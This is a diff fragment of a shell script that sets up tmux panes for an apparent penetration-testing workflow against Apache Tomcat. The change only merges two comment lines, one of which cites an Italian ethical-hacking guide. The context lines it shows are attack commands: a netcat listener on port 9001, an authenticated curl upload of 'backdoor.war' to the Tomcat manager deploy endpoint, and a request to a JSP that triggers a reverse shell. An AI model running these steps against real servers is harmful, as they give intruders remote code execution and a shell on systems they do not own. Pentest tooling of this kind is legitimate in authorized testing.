@@ -2911,8 +2911,7 @@ tmux send-keys -t PT:35.2 "# Tomcat: Reverse Shell - activate listener" Enter
 tmux send-keys -t PT:35.2 "nc –nlvp 9001"
 tmux send-keys -t PT:35.3 "# Tomcat: Reverse Shell - upload reverse shell" Enter
 tmux send-keys -t PT:35.3 "curl -u 'USER:PASS' -X PUT -F \"file=@backdoor.war\" \"http://$ip:8080/manager/text/deploy?path=/backdoor\""
-tmux send-keys -t PT:35.4 "# Tomcat: Reverse Shell - upload reverse shell by means of Application Manager" Enter
-tmux send-keys -t PT:35.4 "# Tomcat: Reverse Shell - refer to Cyber Security: guida pratica ai segreti dell’hacking etico nel 2025" Enter
+tmux send-keys -t PT:35.4 "# Tomcat: Reverse Shell - upload reverse shell by means of Application Manager. Refer to Cyber Security: guida pratica ai segreti dell’hacking etico nel 2025" Enter
 tmux send-keys -t PT:35.5 "# Tomcat: Reverse Shell - activare reverse shell" Enter
 tmux send-keys -t PT:35.5 "curl http://$ip:8080/backdoor/cfbrmtieqk.jsp"
 
